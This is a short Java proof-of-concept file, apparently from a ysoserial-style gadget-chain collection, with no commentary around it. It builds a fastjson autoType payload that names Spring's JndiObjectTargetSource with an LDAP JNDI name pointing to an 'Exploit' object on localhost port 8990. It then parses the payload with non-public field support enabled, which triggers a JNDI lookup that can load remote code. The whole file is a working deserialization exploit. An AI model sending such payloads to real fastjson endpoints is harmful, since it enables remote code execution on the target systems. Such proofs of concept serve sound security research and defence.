package ysoserial.payloads.tabbyGadgetChains.Spring;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc3 {
    public static void main(String[] args) {
        String poc = "{\"@type\":\"org.springframework.jndi.JndiObjectTargetSource\",\"jndiName\":\"ldap://localhost:8990/Exploit\"}";
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
